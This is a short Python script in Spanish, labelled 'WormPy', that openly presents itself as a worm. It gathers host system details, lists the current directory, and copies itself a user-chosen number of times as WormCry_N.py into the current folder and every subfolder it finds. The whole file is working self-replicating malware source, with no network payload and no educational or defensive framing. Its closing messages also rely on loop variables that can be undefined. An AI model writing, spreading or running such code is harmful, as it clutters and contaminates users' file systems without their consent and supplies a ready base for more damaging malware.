#######################################################
#                                                     #
#               Derechos de Autor                     #
#                                                     #
#######################################################
#                                                     #
# © 2024 JossFramework. Todos los derechos reservados #
#                   WormPy                            #  
#                                                     #
#######################################################

import shutil
import time
import platform
import os

# Inicio del programa
print("....................")
print("Iniciando el Worm 🐛")
print("....................\n")
time.sleep(2)

print("-----------------------------------")
print("↪️..Extrayendo info del sistema..")
# Extraer la info del sistema
nombre_sistema = platform.system()
arquitectura = platform.architecture()
version = platform.version()
nodo_de_red = platform.node()

# Imprimir la información obtenida
print("-----------------------------------")
print("Nombre del sistema:", nombre_sistema)
print("Arquitectura:", arquitectura)
print("Versión:", version)
print("Nombre del nodo de red:", nodo_de_red)
print("------------------------------------")



print("Buscando rutas y archivos en el sistema .....\n")
time.sleep(2)
print("- [ !!! Rutas o archivos encontrados !!!] -")
# Busca archivos y directorios en la ruta actual
carpetas_encontradas = []
with os.scandir('.') as directorio:
    for elemento in directorio:
        if elemento.is_file():
            print(f"Archivo: {elemento.name}")
        elif elemento.is_dir():
            print(f"Directorio: {elemento.name}")
            carpetas_encontradas.append(elemento.path)


# Duplicaciones del virus
print("..................................................................")
cantidad = int(input("Ingrese la cantidad de duplicaciones del virus 🐛 :"))
print("..................................................................")

# Obtenemos la ruta del archivo actual
ruta_actual = os.path.abspath(__file__)

# Se distribuye en la ruta actual
for i in range(cantidad):  
    nuevo_nombre = f"WormCry_{i}.py"
    shutil.copy(ruta_actual, nuevo_nombre)
   

    # Copiar en las carpetas encontradas
    for carpeta in carpetas_encontradas:
        shutil.copy(nuevo_nombre, carpeta)
       

# Final del virus
print(f"Worm '{nuevo_nombre}' distribuido exitosamente en la ruta actual.")
print(f"Worm '{nuevo_nombre}' distribuido exitosamente en '{carpeta}'.")
print("-----------------------------------")
